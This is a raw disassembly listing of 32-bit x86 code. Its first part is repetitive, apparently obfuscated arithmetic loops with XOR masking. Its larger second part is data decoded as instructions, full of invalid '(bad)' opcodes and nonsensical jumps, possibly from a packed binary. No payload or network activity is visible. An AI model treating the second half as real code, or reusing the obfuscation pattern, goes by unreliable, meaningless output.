  41b0ae:	mov    ebx,DWORD PTR [ebp-0x48]
  41b0b1:	lea    edx,[ebx+edx*1+0x241fcde]
  41b0b8:	mov    DWORD PTR [ebp-0x48],edx
  41b0bb:	mov    edx,DWORD PTR [ebp+0x8]
  41b0be:	mov    ebx,0xfa5e1521
  41b0c3:	sub    ebx,edx
  41b0c5:	add    ebx,DWORD PTR [ebp-0x44]
  41b0c8:	mov    DWORD PTR [ebp-0x44],ebx
  41b0cb:	mov    edx,DWORD PTR [ebp+0x8]
  41b0ce:	xor    edx,eax
  41b0d0:	add    edx,esi
  41b0d2:	jne    0x41b05b
  41b0d8:	mov    edx,DWORD PTR [ebp-0x14]
  41b0db:	mov    DWORD PTR [ebp+0x8],edx
  41b0de:	jmp    0x41b153
  41b0e3:	mov    edx,DWORD PTR [ebp+0x8]
  41b0e6:	mov    ebx,DWORD PTR [ebp-0x8]
  41b0e9:	xor    edx,eax
  41b0eb:	xor    ebx,eax
  41b0ed:	sub    edx,ebx
  41b0ef:	sub    edx,esi
  41b0f1:	xor    edx,eax
  41b0f3:	mov    DWORD PTR [ebp+0x8],edx
  41b0f6:	mov    edx,DWORD PTR [ebp+0x8]
  41b0f9:	mov    ebx,DWORD PTR [ebp-0x58]
  41b0fc:	add    edx,0x5708f1
  41b102:	imul   edx,ebx
  41b105:	mov    DWORD PTR [ebp-0x58],edx
  41b108:	mov    edx,DWORD PTR [ebp+0x8]
  41b10b:	mov    ebx,DWORD PTR [ebp-0x54]
  41b10e:	add    edx,0x64f893
  41b114:	or     edx,ebx
  41b116:	mov    DWORD PTR [ebp-0x54],edx
  41b119:	mov    edx,DWORD PTR [ebp+0x8]
  41b11c:	mov    ebx,DWORD PTR [ebp-0x50]
  41b11f:	add    edx,ecx
  41b121:	xor    edx,ebx
  41b123:	mov    DWORD PTR [ebp-0x50],edx
  41b126:	mov    edx,DWORD PTR [ebp+0x8]
  41b129:	mov    ebx,DWORD PTR [ebp-0x4c]
  41b12c:	add    edx,edi
  41b12e:	and    edx,ebx
  41b130:	mov    DWORD PTR [ebp-0x4c],edx
  41b133:	mov    edx,DWORD PTR [ebp+0x8]
  41b136:	mov    ebx,DWORD PTR [ebp-0x48]
  41b139:	lea    edx,[ebx+edx*1+0x241fcde]
  41b140:	mov    DWORD PTR [ebp-0x48],edx
  41b143:	mov    edx,DWORD PTR [ebp+0x8]
  41b146:	mov    ebx,0xfa5e1521
  41b14b:	sub    ebx,edx
  41b14d:	add    ebx,DWORD PTR [ebp-0x44]
  41b150:	mov    DWORD PTR [ebp-0x44],ebx
  41b153:	mov    edx,DWORD PTR [ebp+0x8]
  41b156:	xor    edx,eax
  41b158:	add    edx,esi
  41b15a:	jne    0x41b0e3
  41b160:	mov    edx,DWORD PTR [ebp-0x8]
  41b163:	mov    ebx,DWORD PTR [ebp-0xc]
  41b166:	xor    edx,eax
  41b168:	lea    edx,[edx+ebx*1+0x3272ec]
  41b16f:	mov    DWORD PTR [ebp-0xc],edx
  41b172:	mov    edx,DWORD PTR [ebp-0x10]
  41b175:	xor    edx,eax
  41b177:	add    edx,esi
  41b179:	jne    0x411e2e
  41b17f:	jmp    0x41d637
  41b184:	mov    ecx,DWORD PTR [ebp-0x14]
  41b187:	mov    DWORD PTR [ebp+0x8],ecx
  41b18a:	jmp    0x41b203
  41b18f:	mov    ecx,DWORD PTR [ebp+0x8]
  41b192:	mov    edx,DWORD PTR [ebp-0x8]
  41b195:	xor    ecx,eax
  41b197:	xor    edx,eax
  41b199:	sub    ecx,edx
  41b19b:	sub    ecx,esi
  41b19d:	xor    ecx,eax
  41b19f:	mov    DWORD PTR [ebp+0x8],ecx
  41b1a2:	mov    ecx,DWORD PTR [ebp+0x8]
  41b1a5:	mov    edx,DWORD PTR [ebp-0x58]
  41b1a8:	add    ecx,0x5708f1
  41b1ae:	imul   ecx,edx
  41b1b1:	mov    DWORD PTR [ebp-0x58],ecx
  41b1b4:	mov    ecx,DWORD PTR [ebp+0x8]
  41b1b7:	mov    edx,DWORD PTR [ebp-0x54]
  41b1ba:	add    ecx,0x64f893
  41b1c0:	or     ecx,edx
  41b1c2:	mov    DWORD PTR [ebp-0x54],ecx
  41b1c5:	mov    ecx,DWORD PTR [ebp+0x8]
  41b1c8:	mov    edx,DWORD PTR [ebp-0x50]
  41b1cb:	add    ecx,0x242ebcc
  41b1d1:	xor    ecx,edx
  41b1d3:	mov    DWORD PTR [ebp-0x50],ecx
  41b1d6:	mov    ecx,DWORD PTR [ebp+0x8]
  41b1d9:	mov    edx,DWORD PTR [ebp-0x4c]
  41b1dc:	add    ecx,edi
  41b1de:	and    ecx,edx
  41b1e0:	mov    DWORD PTR [ebp-0x4c],ecx
  41b1e3:	mov    ecx,DWORD PTR [ebp+0x8]
  41b1e6:	mov    edx,DWORD PTR [ebp-0x48]
  41b1e9:	lea    ecx,[edx+ecx*1+0x241fcde]
  41b1f0:	mov    DWORD PTR [ebp-0x48],ecx
  41b1f3:	mov    ecx,DWORD PTR [ebp+0x8]
  41b1f6:	mov    edx,0xfa5e1521
  41b1fb:	sub    edx,ecx
  41b1fd:	add    edx,DWORD PTR [ebp-0x44]
  41b200:	mov    DWORD PTR [ebp-0x44],edx
  41b203:	mov    ecx,DWORD PTR [ebp+0x8]
  41b206:	xor    ecx,eax
  41b208:	add    ecx,esi
  41b20a:	jne    0x41b18f
  41b210:	jmp    0x41d643
  41b215:	mov    ecx,DWORD PTR [ebp+0x8]
  41b218:	mov    edx,DWORD PTR [ebp-0x8]
  41b21b:	xor    ecx,eax
  41b21d:	xor    edx,eax
  41b21f:	sub    ecx,edx
  41b221:	sub    ecx,esi
  41b223:	xor    ecx,eax
  41b225:	mov    DWORD PTR [ebp+0x8],ecx
  41b228:	mov    ecx,DWORD PTR [ebp+0x8]
  41b22b:	mov    edx,DWORD PTR [ebp-0x58]
  41b22e:	add    ecx,0x5708f1
  41b234:	imul   ecx,edx
  41b237:	mov    DWORD PTR [ebp-0x58],ecx
  41b23a:	mov    ecx,DWORD PTR [ebp+0x8]
  41b23d:	mov    edx,DWORD PTR [ebp-0x54]
  41b240:	add    ecx,0x64f893
  41b246:	or     ecx,edx
  41b248:	mov    DWORD PTR [ebp-0x54],ecx
  41b24b:	mov    ecx,DWORD PTR [ebp+0x8]
  41b24e:	mov    edx,DWORD PTR [ebp-0x50]
  41b251:	add    ecx,0x242ebcc
  41b257:	xor    ecx,edx
  41b259:	mov    DWORD PTR [ebp-0x50],ecx
  41b25c:	mov    ecx,DWORD PTR [ebp+0x8]
  41b25f:	mov    edx,DWORD PTR [ebp-0x4c]
  41b262:	add    ecx,edi
  41b264:	and    ecx,edx
  41b266:	mov    DWORD PTR [ebp-0x4c],ecx
  41b269:	mov    ecx,DWORD PTR [ebp+0x8]
  41b26c:	mov    edx,DWORD PTR [ebp-0x48]
  41b26f:	jmp    0x41d610
  41b274:	enter  0x7064,0x8f
  41b278:	sar    BYTE PTR [ebx+0x7b],0x1b
  41b27c:	add    al,0xea
  41b27e:	sbb    DWORD PTR [ecx],0x157aec63
  41b284:	mov    dh,0xf0
  41b286:	jge    0x41b302
  41b288:	(bad)  
  41b289:	pop    edi
  41b28a:	jp     0x41b306
  41b28c:	xchg   esp,eax
  41b28d:	test   eax,0xb538ce71
  41b292:	das    
  41b293:	jmp    0x83aee44d
  41b298:	mov    WORD PTR [edx+edi*8-0x540a3991],?
  41b29f:	mov    ds:0x1a8a78f1,al
  41b2a4:	mov    eax,ds:0x687c78e6
  41b2a9:	jmp    DWORD PTR [edi-0xa271eb4]
  41b2af:	sbb    DWORD PTR [edi-0x791fcf7c],esi
  41b2b5:	ret    0x77ed
  41b2b8:	xchg   DWORD PTR [ebp+0x48],esi
  41b2bb:	leave  
  41b2bc:	dec    ebx
  41b2bd:	sub    bl,cl
  41b2bf:	add    al,0x3e
  41b2c1:	scas   al,BYTE PTR es:[edi]
  41b2c2:	pusha  
  41b2c3:	adc    BYTE PTR [edi],0x1e
  41b2c6:	xor    BYTE PTR [edi+0x77],bl
  41b2c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b2ca:	mov    ds:0x7a23df1d,eax
  41b2cf:	pop    edx
  41b2d0:	mov    ds:0x9f3c1ab4,al
  41b2d5:	je     0x41b345
  41b2d7:	add    eax,0xa96535db
  41b2dc:	sub    si,WORD PTR [ecx+0x52876148]
  41b2e3:	cmp    dl,BYTE PTR [ecx-0x1e]
  41b2e6:	sbb    edx,esp
  41b2e8:	dec    esp
  41b2e9:	sbb    eax,0x68533073
  41b2ee:	xlat   BYTE PTR ds:[ebx]
  41b2ef:	adc    DWORD PTR [edi+0x2f],ebp
  41b2f2:	(bad)  
  41b2f3:	int    0x64
  41b2f5:	sbb    al,0x38
  41b2f7:	btr    DWORD PTR [edx-0x80],0x9e
  41b2fc:	es mov ah,0x2a
  41b2ff:	das    
  41b300:	loopne 0x41b2c2
  41b302:	adc    al,0x3b
  41b304:	aam    0x57
  41b306:	dec    esi
  41b307:	mov    al,0x1f
  41b309:	jbe    0x41b381
  41b30b:	cmp    eax,0x4ddb6cd0
  41b310:	xchg   BYTE PTR [edi+ebx*1-0x45],dh
  41b314:	xchg   edx,eax
  41b315:	imul   DWORD PTR [edi-0x64955213]
  41b31b:	loop   0x41b2ec
  41b31d:	dec    esi
  41b31e:	dec    esi
  41b31f:	adc    BYTE PTR [ebp-0xe7cf491],dl
  41b325:	sub    BYTE PTR [esi-0x14],al
  41b328:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b329:	test   al,0x5a
  41b32b:	pop    edx
  41b32c:	ds xchg ecx,eax
  41b32e:	repz out 0xd2,al
  41b331:	mov    ah,0x24
  41b333:	mov    edi,0x9795e2a0
  41b338:	push   ecx
  41b339:	inc    edx
  41b33a:	cdq    
  41b33b:	cmp    eax,0x240554c
  41b340:	dec    ebx
  41b341:	repz sub cl,BYTE PTR [ecx-0x46cffc55]
  41b348:	mov    ch,0x48
  41b34a:	mov    DWORD PTR [edi+0x5aaf0fab],ecx
  41b350:	lock xchg dh,bh
  41b353:	push   esi
  41b354:	pop    eax
  41b355:	push   edi
  41b356:	sahf   
  41b357:	dec    ebx
  41b358:	test   BYTE PTR [edi],0xee
  41b35b:	jae    0x41b3a3
  41b35d:	adc    edx,DWORD PTR [ebp-0x2a3677ed]
  41b363:	or     ch,BYTE PTR [ebx+ecx*2+0x3]
  41b367:	out    0xaa,eax
  41b369:	jge    0x41b3a9
  41b36b:	push   ebp
  41b36c:	add    eax,0x5eebf8bd
  41b371:	fisub  WORD PTR ss:[edx]
  41b374:	lods   al,BYTE PTR ds:[esi]
  41b375:	gs and al,0x23
  41b378:	je     0x41b360
  41b37a:	xor    eax,0x68d22c3a
  41b37f:	jecxz  0x41b36b
  41b381:	js     0x41b400
  41b383:	jecxz  0x41b3ed
  41b385:	dec    ecx
  41b387:	sbb    eax,0x4b64fdcf
  41b38c:	sub    eax,0xaf77c476
  41b391:	cmp    edx,DWORD PTR [edx+0x64]
  41b394:	inc    DWORD PTR ds:0xafe73f7f
  41b39a:	xchg   ecx,eax
  41b39b:	addr16 inc edx
  41b39d:	sahf   
  41b39e:	and    BYTE PTR [ecx],ah
  41b3a0:	add    edx,esi
  41b3a2:	int3   
  41b3a3:	pop    ebp
  41b3a4:	xor    DWORD PTR [ecx],esp
  41b3a6:	in     al,dx
  41b3a7:	sub    al,0x9f
  41b3a9:	ror    DWORD PTR [ebx+0x75191dcb],0x67
  41b3b0:	in     al,0x80
  41b3b2:	cmp    ebp,0x3dfa0f47
  41b3b8:	add    ch,dl
  41b3ba:	pop    es
  41b3bb:	push   ecx
  41b3bc:	mov    al,0xa2
  41b3be:	out    dx,eax
  41b3bf:	push   edx
  41b3c0:	mov    bh,0xbd
  41b3c2:	mov    dh,0x14
  41b3c4:	sbb    eax,0x9a464825
  41b3c9:	add    al,0x65
  41b3cb:	mov    ebx,DWORD PTR [ebx+0x6c]
  41b3ce:	in     al,dx
  41b3cf:	(bad)  
  41b3d0:	ds data16 jl 0x41b41b
  41b3d4:	jbe    0x41b44a
  41b3d6:	sbb    esp,DWORD PTR [ecx+0x1d8f1275]
  41b3dc:	xlat   BYTE PTR ds:[ebx]
  41b3dd:	out    dx,eax
  41b3de:	adc    ebp,0xf914b6d1
  41b3e4:	adc    esi,ecx
  41b3e6:	add    dl,BYTE PTR [edx]
  41b3e8:	cmc    
  41b3e9:	jmp    0x204d078c
  41b3ee:	mov    dl,0xf9
  41b3f0:	aad    0xd1
  41b3f2:	inc    eax
  41b3f3:	aad    0xd8
  41b3f5:	scas   eax,DWORD PTR es:[edi]
  41b3f6:	cld    
  41b3f7:	aas    
  41b3f8:	mov    ch,0x9d
  41b3fa:	fwait
  41b3fb:	and    al,0x68
  41b3fd:	scas   al,BYTE PTR es:[edi]
  41b3fe:	js     0x41b3b2
  41b400:	or     edx,DWORD PTR [edx+0x68]
  41b403:	test   eax,0xe3326f7b
  41b408:	dec    edx
  41b409:	test   cl,cl
  41b40b:	inc    esi
  41b40c:	push   0xffffffbf
  41b40e:	jp     0x41b3ab
  41b410:	fidivr WORD PTR [ebx+0x42a17dc4]
  41b416:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b417:	ins    BYTE PTR es:[edi],dx
  41b418:	mov    al,0x70
  41b41a:	jno    0x41b3b2
  41b41c:	sahf   
  41b41d:	mov    ebp,0x1d755242
  41b422:	fcomip st,st(3)
  41b424:	aaa    
  41b425:	loop   0x41b3b1
  41b427:	ins    DWORD PTR es:[edi],dx
  41b428:	xor    edx,DWORD PTR [edx-0x73]
  41b42b:	out    dx,eax
  41b42c:	or     ebp,DWORD PTR fs:[ecx*1-0x5e429711]
  41b434:	sbb    DWORD PTR [eax+0xc6f395e],0x105ff72c
  41b43e:	xor    ebx,edx
  41b440:	(bad)  [edx]
  41b442:	xchg   esi,eax
  41b443:	fdivr  QWORD PTR [ecx+0x7ce3014e]
  41b449:	sub    DWORD PTR [ebp+0x6a07eb94],edi
  41b44f:	arpl   WORD PTR [ebx-0x11],ax
  41b452:	xchg   edi,eax
  41b453:	pop    ss
  41b454:	outs   dx,DWORD PTR ds:[esi]
  41b455:	lods   eax,DWORD PTR ds:[esi]
  41b456:	cs addr16 loopne 0x41b451
  41b45a:	pop    ecx
  41b45b:	and    ch,BYTE PTR [esi+0x70]
  41b45e:	cmp    ch,al
  41b460:	imul   bh
  41b462:	cmp    esi,DWORD PTR [ebp+0x61]
  41b465:	outs   dx,BYTE PTR ds:[esi]
  41b466:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b467:	enter  0x8f29,0xbb
  41b46b:	fucomip st,st(7)
  41b46d:	add    edi,DWORD PTR [edi]
  41b46f:	cmp    eax,0x43090204
  41b474:	push   0x7d8e5ab2
  41b479:	pusha  
  41b47a:	popf   
  41b47b:	add    edx,DWORD PTR [edi-0x12]
  41b47e:	lahf   
  41b47f:	inc    esi
  41b480:	add    eax,0xf4e61f91
  41b485:	pop    ss
  41b486:	imul   ebx,DWORD PTR [edx-0x4f],0x2d
  41b48a:	jae    0x41b4bc
  41b48c:	push   ebx
  41b48d:	dec    eax
  41b48e:	inc    edx
  41b48f:	mov    cs,esi
  41b491:	cmc    
  41b492:	dec    ebp
  41b493:	sbb    al,0x8c
  41b495:	fmul   QWORD PTR [edi+0x2e]
  41b498:	shl    ecx,1
  41b49a:	loop   0x41b42e
  41b49c:	int3   
  41b49d:	push   edi
  41b49e:	dec    edi
  41b49f:	retf   0x89b3
  41b4a2:	jmp    0x41b487
  41b4a4:	mov    edx,eax
  41b4a6:	sbb    eax,0x58850c34
  41b4ab:	std    
  41b4ac:	clc    
  41b4ad:	mov    ecx,0x1ba8f446
  41b4b2:	jmp    0x2e79ce52
  41b4b7:	(bad)  
  41b4b8:	or     DWORD PTR ds:[edx-0x106e5f93],ebx
  41b4bf:	scas   eax,DWORD PTR es:[edi]
  41b4c0:	(bad)  
  41b4c1:	pusha  
  41b4c2:	cmp    ch,BYTE PTR [ebx+0x76cf59da]
  41b4c8:	pop    ecx
  41b4c9:	(bad)  
  41b4ca:	mov    edx,?
  41b4cc:	dec    esi
  41b4cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b4ce:	rcl    BYTE PTR [ecx+ebp*8+0x270b1d47],0xf5
  41b4d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b4d7:	mov    esp,0xfc1a198b
  41b4dc:	mov    BYTE PTR [edi+0x5d],ah
  41b4df:	mov    ebp,0x5f71aa09
  41b4e4:	fcomi  st,st(7)
  41b4e6:	addr16 inc ebx
  41b4e8:	xor    BYTE PTR [ebx-0x5f036cc5],ch
  41b4ee:	pop    ecx
  41b4ef:	cmp    DWORD PTR ds:0xbef8c2ad,edi
  41b4f5:	add    eax,0x8fd75344
  41b4fa:	mov    ch,0xdf
  41b4fc:	inc    ebp
  41b4fd:	jge    0x41b55b
  41b4ff:	push   ds
  41b500:	xor    esp,DWORD PTR [eax+0x17]
  41b503:	sahf   
  41b504:	jle    0x41b571
  41b506:	shl    DWORD PTR [eax],1
  41b508:	dec    edx
  41b509:	fdiv   DWORD PTR [ecx+0x672bbaab]
  41b50f:	xchg   ebp,eax
  41b510:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b511:	cmp    al,0x9
  41b513:	iret   
  41b514:	rcr    ch,0x20
  41b517:	sbb    dh,bl
  41b519:	mov    BYTE PTR [edi],bl
  41b51b:	repnz addr16 pop esi
  41b51e:	add    eax,0xc974b27c
  41b523:	rep outs dx,DWORD PTR ds:[esi]
  41b525:	cmp    BYTE PTR [ecx+0x54],0x6
  41b529:	push   eax
  41b52a:	ss jge 0x41b4d3
  41b52d:	lods   eax,DWORD PTR ds:[esi]
  41b52e:	ss xchg esi,eax
  41b530:	sub    eax,0x5f7a2ad3
  41b535:	lods   eax,DWORD PTR ds:[esi]
  41b536:	push   esp
  41b537:	or     ebp,esp
  41b539:	push   edx
  41b53a:	xlat   BYTE PTR ds:[ebx]
  41b53b:	inc    ecx
  41b53c:	xchg   ecx,eax
  41b53d:	test   BYTE PTR [edx+0x50],dh
  41b540:	cdq    
  41b541:	repnz mov bp,0xe37f
  41b546:	mov    eax,0xe761031a
  41b54b:	and    BYTE PTR [esi-0x3c],0x22
  41b54f:	jno    0x41b5cb
  41b551:	dec    BYTE PTR [ebx]
  41b553:	(bad)  
  41b554:	fidivr DWORD PTR [edx+0x6e]
  41b557:	or     ecx,ebx
  41b559:	inc    ecx
  41b55a:	js     0x41b546
  41b55c:	push   ss
  41b55d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b55e:	in     eax,dx
  41b55f:	cmp    dl,BYTE PTR [ebx+0x334790c4]
  41b565:	or     ecx,DWORD PTR [edx+0xe]
  41b568:	in     al,dx
  41b569:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b56a:	shr    DWORD PTR [edi],cl
  41b56c:	es add al,0x2c
  41b56f:	mov    ecx,0xf6aeb39
  41b574:	cmp    dl,BYTE PTR [ecx+ebx*1-0x15]
  41b578:	mov    edx,DWORD PTR [eax+0x1bdf00a5]
  41b57e:	sbb    BYTE PTR [eax],ch
  41b580:	mov    eax,ds:0x45d23888
  41b585:	std    
  41b586:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b587:	push   edx
  41b588:	loope  0x41b5be
  41b58a:	aad    0x27
  41b58c:	nop
  41b58d:	sbb    ebx,DWORD PTR [ecx-0x7cb87acb]
  41b593:	mov    eax,0xf55a70dd
  41b598:	jle    0x41b54c
  41b59a:	es lock inc ecx
  41b59d:	inc    ebp
  41b59e:	or     eax,0x14ffcf1d
  41b5a3:	ins    DWORD PTR es:[edi],dx
  41b5a4:	mov    dh,0xed
  41b5a6:	xchg   ecx,eax
  41b5a7:	mov    dh,0xa5
  41b5a9:	sti    
  41b5aa:	vshufpd xmm7,xmm0,XMMWORD PTR [ebx-0x71],0xf
  41b5b0:	or     DWORD PTR es:[edi-0x1c],edx
  41b5b4:	sub    eax,0x64dcc91e
  41b5b9:	es into 
  41b5bb:	push   edi
  41b5bc:	and    ebp,DWORD PTR [edx+ecx*2+0x2e73dcf8]
  41b5c3:	and    eax,0xb60afef5
  41b5c8:	mov    DWORD PTR fs:[eax-0x71],0x4b642816
  41b5d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b5d1:	scas   eax,DWORD PTR es:[edi]
  41b5d2:	std    
  41b5d3:	mov    cl,0x7f
  41b5d5:	jl     0x41b5a3
  41b5d7:	mov    DWORD PTR [esi],ebx
  41b5d9:	push   ss
  41b5da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b5db:	les    ebp,FWORD PTR [esi]
  41b5dd:	clc    
  41b5de:	aad    0x96
  41b5e0:	inc    ebx
  41b5e1:	nop
  41b5e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b5e3:	test   al,0xbc
  41b5e5:	shl    DWORD PTR [eax],0x48
  41b5e8:	mov    WORD PTR [ebx],cs
  41b5ea:	daa    
  41b5eb:	mov    di,0x5ec0
  41b5ef:	popf   
  41b5f0:	sub    DWORD PTR [ecx-0x5964a144],edi
  41b5f6:	(bad)  
  41b5f7:	push   edi
  41b5f8:	and    al,0x13
  41b5fa:	icebp  
  41b5fb:	jle    0x41b638
  41b5fd:	enter  0xbb1d,0x59
  41b601:	cmp    al,0xb2
  41b603:	mov    ds:0x3915db9d,al
  41b608:	push   edx
  41b609:	mov    ebp,0xda1f3618
  41b60e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b60f:	pusha  
  41b610:	pop    edx
  41b611:	pusha  
  41b612:	(bad)  
  41b614:	jne    0x41b5a1
  41b616:	retf   0x313d
  41b619:	idiv   ch
  41b61b:	xchg   edi,eax
  41b61c:	mov    ch,BYTE PTR [ebp+ebx*4+0x2423c45e]
  41b623:	push   0x4f
  41b625:	les    ebp,FWORD PTR [esi-0x3f]
  41b628:	test   BYTE PTR ds:0x1e419a55,0xa8
  41b62f:	and    edi,esp
  41b631:	pop    es
  41b632:	xchg   ecx,eax
  41b633:	push   edx
  41b634:	out    dx,eax
  41b635:	iret   
  41b636:	pop    esp
  41b637:	fild   WORD PTR [ebp+0x2a]
  41b63a:	int    0x1c
  41b63c:	ror    BYTE PTR [edx+esi*1-0x516ca4bb],cl
  41b643:	dec    esp
  41b644:	sbb    DWORD PTR [ebx],esi
  41b646:	jbe    0x41b61b
  41b648:	imul   esp,DWORD PTR [ecx+0x7f],0xffffffa5
  41b64c:	cs pop ds
  41b64e:	repz and DWORD PTR [edx+0x3b],0x5a7eec77
  41b656:	jb     0x41b608
  41b658:	repnz ins DWORD PTR es:[edi],dx
  41b65a:	mov    ch,BYTE PTR [ebp-0xb]
  41b65d:	aam    0xc4
  41b65f:	fnsave [eax]
  41b661:	aad    0x9f
  41b663:	call   0x1ca4badf
  41b668:	inc    ebp
  41b669:	and    edx,eax
  41b66b:	inc    eax
  41b66c:	or     eax,0xa905266d
  41b671:	inc    ebx
  41b672:	pop    eax
  41b673:	fisub  WORD PTR [esi-0x59f281e4]
  41b679:	repz add DWORD PTR cs:[edi],eax
  41b67d:	mov    ecx,DWORD PTR [edx]
  41b67f:	dec    esi
  41b680:	mov    BYTE PTR [eax],ch
  41b682:	xchg   ecx,eax
  41b683:	cmp    eax,0xcbf90b4f
  41b688:	pop    ebp
  41b689:	adc    eax,0xe0fcf7a7
  41b68e:	(bad)  
  41b68f:	adc    al,ah
  41b691:	adc    eax,0xfbcb8265
  41b696:	(bad)  
  41b697:	scas   eax,DWORD PTR es:[edi]
  41b698:	inc    edi
  41b699:	imul   ebx,DWORD PTR [eax+0x65],0x85157e2
  41b6a0:	outs   dx,DWORD PTR ds:[esi]
  41b6a1:	mov    bh,0x87
  41b6a3:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  41b6a5:	mov    bh,0xef
  41b6a7:	test   eax,0xaa79151b
  41b6ac:	sbb    DWORD PTR [edi-0x1c2a6ba9],ebp
  41b6b2:	dec    eax
  41b6b3:	inc    eax
  41b6b4:	pop    es
  41b6b5:	shl    DWORD PTR es:[ebx+0x39e062b7],0xc8
  41b6bd:	stos   BYTE PTR es:[edi],al
  41b6be:	xor    eax,0x4493645b
  41b6c3:	arpl   WORD PTR ds:0x563769ed,di
  41b6c9:	or     cl,BYTE PTR ds:0x9a8d08b2
  41b6cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b6d0:	mov    bh,0xd4
  41b6d2:	dec    esi
  41b6d3:	add    ebp,DWORD PTR [eax]
  41b6d5:	xchg   esi,eax
  41b6d6:	xlat   BYTE PTR ds:[ebx]
  41b6d7:	push   ebx
  41b6d8:	fwait
  41b6d9:	sbb    BYTE PTR [ebp-0x3b],ch
  41b6dc:	je     0x41b6ca
  41b6de:	jle    0x41b666
  41b6e0:	(bad)  
  41b6e1:	(bad)  [edi+eiz*2-0x4f]
  41b6e5:	mov    eax,ds:0xb8969565
  41b6ea:	enter  0x629d,0xb0
  41b6ee:	(bad)  
  41b6ef:	outs   dx,DWORD PTR ds:[esi]
  41b6f0:	out    dx,eax
  41b6f1:	popa   
  41b6f2:	cmp    ch,BYTE PTR [eax+0x11ae85b]
  41b6f8:	pop    esp
  41b6f9:	cmp    al,0x47
  41b6fb:	rep outs dx,BYTE PTR ds:[esi]
  41b6fd:	pop    esi
  41b6fe:	add    al,0x36
  41b700:	ds ret 0xbebb
  41b704:	in     eax,0x3d
  41b706:	(bad)  
  41b707:	inc    ebp
  41b709:	sti    
  41b70a:	inc    ecx
  41b70b:	inc    eax
  41b70c:	jae    0x41b747
  41b70e:	addr16 jnp 0x41b78d
  41b711:	aas    
  41b712:	(bad)  
  41b714:	pop    ecx
  41b715:	xchg   esp,eax
  41b716:	daa    
  41b717:	fs mov eax,0xcb23c764
  41b71d:	push   cs
  41b71e:	jg     0x41b772
  41b720:	sbb    ebp,DWORD PTR [ecx-0x76]
  41b723:	sub    eax,0xb9cb0883
  41b728:	dec    ecx
  41b729:	cmp    al,0x3b
  41b72b:	add    DWORD PTR [edx+0x11],ebx
  41b72e:	pop    eax
  41b72f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b730:	mov    bl,0x62
  41b732:	adc    esp,DWORD PTR [ebx]
  41b734:	(bad)  
  41b735:	out    0x68,al
  41b737:	repz mov dh,0x5e
  41b73a:	repnz leave 
  41b73c:	lods   eax,DWORD PTR ds:[esi]
  41b73d:	xchg   esp,eax
  41b73e:	dec    esi
  41b73f:	stc    
  41b740:	adc    eax,0x34862824
  41b745:	or     edx,DWORD PTR [esi]
  41b747:	rcl    BYTE PTR [ecx],0xcf
  41b74a:	aaa    
  41b74b:	sub    edi,DWORD PTR [edx-0x2b]
  41b74e:	(bad)  
  41b74f:	leave  
  41b750:	push   edi
  41b751:	jb     0x41b79b
  41b753:	xchg   esi,eax
  41b754:	ret    
  41b755:	test   BYTE PTR [esi+eax*2+0x713afac5],ah
  41b75c:	in     eax,dx
  41b75d:	pop    ss
  41b75e:	jg     0x41b6ef
  41b760:	inc    esi
  41b761:	xchg   ebx,eax
  41b762:	bound  esp,QWORD PTR [esi+0x7804f053]
  41b768:	xchg   edx,eax
  41b769:	cwde   
  41b76a:	cmp    BYTE PTR [edx],dh
  41b76c:	pop    edx
  41b76d:	and    al,0xf2
  41b76f:	pop    ebp
  41b770:	cmp    BYTE PTR [ebx],dh
  41b772:	adc    BYTE PTR [edi+0x54af0efd],ch
  41b778:	je     0x41b750
  41b77a:	adc    BYTE PTR [edx],ah
  41b77c:	les    eax,FWORD PTR [bx+di-0x6934]
  41b781:	fs call 0x1373:0x271b94ff
  41b789:	std    
  41b78a:	jmp    0x41b727
  41b78c:	inc    ebp
  41b78d:	scas   eax,DWORD PTR es:[edi]
  41b78e:	xchg   ecx,eax
  41b78f:	je     0x41b738
  41b791:	stos   DWORD PTR es:[edi],eax
  41b792:	dec    edi
  41b793:	or     esp,eax
  41b795:	push   ds
  41b796:	and    al,0xa
  41b798:	repz sbb DWORD PTR [ecx-0x3c],ebp
  41b79c:	fisub  WORD PTR [edi+0x717d574b]
  41b7a2:	(bad)  [edi]
  41b7a4:	ret    0x636
  41b7a7:	aaa    
  41b7a8:	jns    0x41b7ca
  41b7aa:	pop    ebx
  41b7ab:	ins    BYTE PTR es:[edi],dx
  41b7ac:	inc    ebp
  41b7ad:	sbb    ecx,DWORD PTR [edx]
  41b7af:	push   0xffffff8d
  41b7b1:	(bad)  
  41b7b2:	xor    esp,DWORD PTR [ebx+0x58]
  41b7b5:	add    edi,DWORD PTR [edi-0x76]
  41b7b8:	or     bl,BYTE PTR [ebx-0x2a]
  41b7bb:	xchg   BYTE PTR [ebx],ah
  41b7bd:	out    0x2d,al
  41b7bf:	ret    
  41b7c0:	xor    DWORD PTR [ecx+ecx*4+0xbdefdc5],edi
  41b7c7:	cld    
  41b7c8:	out    0x2e,eax
  41b7ca:	ja     0x41b776
  41b7cc:	lahf   
  41b7cd:	inc    edx
  41b7ce:	and    DWORD PTR [esi],edi
  41b7d0:	ficomp DWORD PTR [esi+0x5a]
  41b7d3:	call   DWORD PTR [eax+0x23]
  41b7d6:	test   eax,0x4872b7c6
  41b7db:	or     al,0x6a
  41b7dd:	inc    ebx
  41b7de:	jmp    0x5c604d27
  41b7e3:	jo     0x41b81c
  41b7e5:	aaa    
  41b7e6:	adc    DWORD PTR [ecx+0x368bc02c],ebp
  41b7ec:	shr    DWORD PTR [ebp-0x7f2b95e8],1
  41b7f2:	mov    ds:0x46a77756,eax
